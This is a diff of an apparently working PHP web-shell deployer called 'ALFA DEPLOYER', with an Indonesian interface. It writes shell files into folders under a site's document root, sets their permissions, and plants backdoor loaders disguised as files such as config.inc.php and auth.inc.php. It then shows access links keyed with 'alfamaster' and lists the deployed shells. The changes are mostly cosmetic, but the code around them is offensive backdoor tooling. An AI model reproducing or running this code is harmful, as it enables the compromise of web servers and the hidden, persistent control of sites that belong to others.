@@ -56,7 +56,7 @@ die("❌ Shell not found");
 if(@file_put_contents($path,$content)){@chmod($path,0644);return true;}
 return false;
 }
-function getAllFolders($path,$depth=0,$max_depth=5){
+function getAllFolders($path,$depth=0,$max_depth=4){
 $items=[];
 if($depth>$max_depth||!is_dir($path)||!is_readable($path))return $items;
 $dirs=scandir($path);
@@ -102,17 +102,17 @@ $src_folder=$base_path.'/src';
 $sourcemap_folder=$base_path.'/SourceMap';
 $full_src=$doc_root.'/'.$src_folder;
 $full_sourcemap=$doc_root.'/'.$sourcemap_folder;
-if(createFolder($full_src)){$messages[]="✅ src: ".str_replace($doc_root,'',$full_src);}
-if(createFolder($full_sourcemap)){$messages[]="✅ SourceMap: ".str_replace($doc_root,'',$full_sourcemap);}
+if(createFolder($full_src)){$messages[]="✅ src folder created";}
+if(createFolder($full_sourcemap)){$messages[]="✅ SourceMap folder created";}
 $file_success=0;
 foreach($file_names as $name){
 if(!empty($name)){
 $path=$full_src.'/'.$name;
 if(createShellFile($path,$shell_content)){
 $src_files_created[]=['name'=>$name,'path'=>$path,'rel_path'=>$src_folder.'/'.$name];
-$messages[]="✅ ".$name;
+$messages[]="✅ {$name}";
 $file_success++;
-}else{$messages[]="❌ ".$name;}
+}else{$messages[]="❌ {$name}";}
 }
 }
 if(!empty($permission)&&$file_success>0){
@@ -121,58 +121,62 @@ if(chmodFolder($full_src,$permission)){$messages[]="✅ chmod {$permission}";}
 $loaders=['config.inc.php','settings.inc.php','cache.inc.php','session.inc.php','auth.inc.php','loader.inc.php','index.php','shell.php'];
 foreach($loaders as $loader){
 $path=$full_sourcemap.'/'.$loader;
-if(createLoader($path,$latest_shell)){$loaders_created[]=$loader;$messages[]="✅ ".$loader;}
+if(createLoader($path,$latest_shell)){$loaders_created[]=$loader;$messages[]="✅ {$loader}";}
 }
 }
 if(isset($_GET['clean'])){
 foreach(glob('/tmp/*.php')as$f)@unlink($f);
 $messages[]="🧹 Cleaned";
 }
-$all_paths=getAllFolders($doc_root,0,5);
+$all_paths=getAllFolders($doc_root,0,4);
 $domain=(isset($_SERVER['HTTPS'])?'https://':'http://').$_SERVER['HTTP_HOST'];
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>ALFA</title>
+<title>ALFA DEPLOYER</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;padding:10px}
-.box{max-width:750px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:4px;padding:15px}
-h1{font-size:18px;color:#00ff00}
-.sub{color:#666;font-size:10px}
-.stats{display:flex;gap:12px;font-size:10px;color:#666;margin:4px 0}
-.stats span{color:#00ff00}
-.msg{padding:2px 6px;font-size:10px;margin:1px 0}
-.ok{color:#00ff00}
-.err{color:#ff4d4d}
-label{color:#666;font-size:9px}
-.inp,.sel{width:100%;background:#000;border:1px solid #333;padding:4px 8px;color:#00ff00;font-family:'Courier New';font-size:10px;border-radius:2px;outline:none}
-.inp:focus,.sel:focus{border-color:#00ff00}
-.btn{padding:4px 14px;background:#00ff00;color:#000;border:none;border-radius:2px;font-weight:700;cursor:pointer;font-family:'Courier New';font-size:10px}
-.btn-r{background:#ff3333;color:#fff}
-.btn-b{background:transparent;color:#00b8ff;border:1px solid rgba(0,184,255,.3)}
-.flex{display:flex;gap:5px;flex-wrap:wrap;margin:5px 0}
-.row{display:flex;gap:5px;align-items:center;margin:2px 0}
-.row label{min-width:20px;font-size:9px;color:#666}
+body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,monospace;padding:15px}
+.box{max-width:800px;margin:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:25px}
+h1{font-size:26px;color:#58a6ff;font-weight:700;letter-spacing:-0.5px}
+.sub{color:#8b949e;font-size:14px;margin-top:2px}
+.stats{display:flex;gap:18px;font-size:13px;color:#8b949e;margin:10px 0;padding:10px 0;border-bottom:1px solid #21262d}
+.stats span{color:#f0f6fc;font-weight:600}
+.msg{padding:6px 12px;font-size:13px;margin:3px 0;border-radius:4px}
+.ok{color:#3fb950}
+.err{color:#f85149}
+label{color:#8b949e;font-size:13px;font-weight:500;display:block;margin-bottom:4px}
+.inp,.sel{width:100%;background:#0d1117;border:1px solid #30363d;padding:8px 12px;color:#c9d1d9;font-size:14px;border-radius:4px;outline:none}
+.inp:focus,.sel:focus{border-color:#58a6ff}
+.btn{padding:6px 20px;background:#238636;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer;font-size:13px;transition:background .2s}
+.btn:hover{background:#2ea043}
+.btn-r{background:#da3633}
+.btn-r:hover{background:#f85149}
+.btn-b{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
+.btn-b:hover{background:#30363d}
+.flex{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0}
+.row{display:flex;gap:8px;align-items:center;margin:4px 0}
+.row label{min-width:30px;font-size:13px;color:#8b949e}
 .row input{flex:1}
-.path-list{background:#000;border:1px solid #1a1a1a;border-radius:2px;padding:3px;max-height:120px;overflow:auto;font-size:10px;margin:3px 0}
-.pi{display:flex;gap:5px;padding:2px 5px;cursor:pointer;border-bottom:1px solid #0a0a0a}
-.pi:hover{background:#0a0a0a}
-.pi .n{color:#444;min-width:18px}
-.pi .t{color:#ccc;flex:1;word-break:break-all}
-.pi .p{color:#00b8ff;font-size:8px}
-.sel{background:rgba(0,255,0,.05);border-left:2px solid #00ff00}
-.box2{border:1px solid #1a1a1a;border-radius:2px;padding:8px;margin:4px 0;background:#0a0a0a}
-.pre{background:#000;padding:4px;border-radius:2px;font-size:9px;color:#666;line-height:1.4}
-.pre .h{color:#ffb347}
-.link{color:#00b8ff;text-decoration:none;font-size:10px}
-.link:hover{color:#00ff00}
-.badge{color:#ffb347;font-size:8px;border:1px solid rgba(255,179,71,.2);padding:0 4px;border-radius:2px}
-.cp{background:#000;padding:4px;border-radius:2px;font-size:9px;color:#666;max-height:100px;overflow:auto;word-break:break-all;margin:4px 0}
-.ft{color:#444;font-size:8px;margin-top:6px;border-top:1px solid #1a1a1a;padding-top:4px}
-.ct{color:#666;font-size:8px}
-.gap{margin-top:4px}
+.path-list{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:4px;max-height:200px;overflow:auto;font-size:13px;margin:4px 0}
+.pi{display:flex;gap:8px;padding:4px 8px;cursor:pointer;border-bottom:1px solid #161b22}
+.pi:hover{background:#161b22}
+.pi .n{color:#8b949e;min-width:22px}
+.pi .t{color:#c9d1d9;flex:1;word-break:break-all}
+.pi .p{color:#58a6ff;font-size:12px}
+.sel{background:#161b22;border-left:2px solid #58a6ff}
+.box2{border:1px solid #21262d;border-radius:4px;padding:12px;margin:6px 0;background:#0d1117}
+.pre{background:#0d1117;padding:8px;border-radius:4px;font-size:13px;color:#8b949e;border:1px solid #21262d}
+.pre .h{color:#58a6ff}
+.link{color:#58a6ff;text-decoration:none;font-size:13px}
+.link:hover{color:#1f6feb}
+.badge{color:#d29922;font-size:11px;border:1px solid rgba(210,153,34,.3);padding:0 6px;border-radius:3px}
+.cp{background:#0d1117;border:1px solid #21262d;border-radius:4px;padding:8px;font-size:12px;color:#8b949e;max-height:120px;overflow:auto;word-break:break-all;margin:6px 0}
+.ft{color:#8b949e;font-size:11px;margin-top:10px;border-top:1px solid #21262d;padding-top:10px}
+.ct{color:#8b949e;font-size:12px;margin:2px 0}
+.gap{margin-top:6px}
+.path-selected{color:#58a6ff;font-weight:600;font-size:14px}
 </style>
 <script>
 function pick(p){document.getElementById('bp').value=p;}
@@ -187,30 +191,32 @@ el.style.display=t.indexOf(q)===-1?'none':'flex';
 </head>
 <body>
 <div class="box">
-<h1>⚡ ALFA</h1>
-<div class="sub">Pilih path &rarr; Deploy</div>
+<h1>⚡ ALFA DEPLOYER</h1>
+<div class="sub">Pilih path → Deploy → Akses</div>
 <div class="stats">
-Shells: <span><?=count($deployed)?></span> | Files: <span>5</span> | Loaders: <span>8</span>
+<span>Shells: <?=count($deployed)?></span>
+<span>Files: 5</span>
+<span>Loaders: 8</span>
 </div>
 <?php foreach($messages as $m){$c=strpos($m,'✅')!==false?'ok':'err';echo'<div class="msg '.$c.'">'.$m.'</div>';}?>
 <form method="post">
 <div class="box2">
 <label>📂 Path</label>
-<div style="color:#666;font-size:9px">Selected: <span style="color:#00ff00"><?=htmlspecialchars($base_path)?></span></div>
-<input type="text" id="s" class="inp" placeholder="🔍 cari..." onkeyup="filter()" style="margin:2px 0">
+<div style="color:#8b949e;font-size:13px;margin-bottom:4px">Selected: <span class="path-selected"><?=htmlspecialchars($base_path)?></span></div>
+<input type="text" id="s" class="inp" placeholder="🔍 Cari path..." onkeyup="filter()" style="margin-bottom:4px">
 <div class="path-list">
-<?php if(empty($all_paths)){echo'<div style="color:#666;padding:5px;text-align:center">No folders</div>';}else{$i=0;foreach($all_paths as $p){$i++;$sel=($p===$base_path)?'sel':'';echo'<div class="pi '.$sel.'" onclick="pick(\''.htmlspecialchars($p).'\')"><span class="n">'.$i.'.</span><span class="t">'.htmlspecialchars($p).'</span><span class="p">➡</span></div>';}}?>
+<?php if(empty($all_paths)){echo'<div style="color:#8b949e;padding:10px;text-align:center">Tidak ada folder</div>';}else{$i=0;foreach($all_paths as $p){$i++;$sel=($p===$base_path)?'sel':'';echo'<div class="pi '.$sel.'" onclick="pick(\''.htmlspecialchars($p).'\')"><span class="n">'.$i.'.</span><span class="t">'.htmlspecialchars($p).'</span><span class="p">➡</span></div>';}}?>
 </div>
 <div class="ct">Total: <?=count($all_paths)?> paths</div>
-<input type="text" id="bp" name="base_path" value="<?=htmlspecialchars($base_path)?>" class="inp" style="margin:2px 0">
-<div style="display:flex;gap:5px;margin:4px 0">
-<select name="permission" class="sel" style="flex:1;padding:3px 6px">
+<input type="text" id="bp" name="base_path" value="<?=htmlspecialchars($base_path)?>" class="inp" style="margin-top:4px">
+<div style="display:flex;gap:8px;margin-top:6px">
+<select name="permission" class="sel" style="flex:1;padding:6px 10px;font-size:13px">
 <option value="1111" <?=$permission=='1111'?'selected':''?>>1111</option>
 <option value="0755" <?=$permission=='0755'?'selected':''?>>0755</option>
 <option value="0777" <?=$permission=='0777'?'selected':''?>>0777</option>
 <option value="0644" <?=$permission=='0644'?'selected':''?>>0644</option>
 </select>
-<button type="submit" name="action" value="deploy" class="btn">Deploy</button>
+<button type="submit" name="action" value="deploy" class="btn">🚀 Deploy</button>
 </div>
 </div>
 <div class="box2">
@@ -230,20 +236,20 @@ Shells: <span><?=count($deployed)?></span> | Files: <span>5</span> | Loaders: <s
 <label>📋 Preview</label>
 <div class="pre">
 <span class="h"><?=$doc_root?>/<?=$base_path?>/src/</span> <span class="badge"><?=$permission?></span>
-<?php foreach($file_names as $n){if(!empty($n)){echo'<span style="color:#00ff00;margin-left:4px">'.$n.'</span>';}}?>
+<?php foreach($file_names as $n){if(!empty($n)){echo'<span style="color:#f0f6fc;margin-left:6px">'.$n.'</span>';}}?>
 </div>
 </div>
 <?php if($action==='deploy'&&!empty($src_files_created)){?>
 <div class="box2">
 <label>🔗 Access</label>
-<?php foreach($src_files_created as $f){echo'<div><a href="'.$domain.'/'.htmlspecialchars($f['rel_path']).'?key=alfamaster" target="_blank" class="link">🔗 '.$f['name'].'</a></div>';}?>
+<?php foreach($src_files_created as $f){echo'<div style="padding:2px 0"><a href="'.$domain.'/'.htmlspecialchars($f['rel_path']).'?key=alfamaster" target="_blank" class="link">🔗 '.$f['name'].'</a></div>';}?>
 </div>
 <?php }?>
 <div class="cp">
-<strong>Shells:</strong><br>
+<strong style="color:#f0f6fc">Shells:</strong><br>
 <?php foreach($deployed as $f){echo $domain.'/tmp/'.$f['file'].'<br>';}?>
 </div>
-<div class="ft">ALFA | <?=date('Y-m-d H:i:s')?></div>
+<div class="ft">ALFA DEPLOYER | <?=date('Y-m-d H:i:s')?></div>
 </div>
 </body>
 </html>
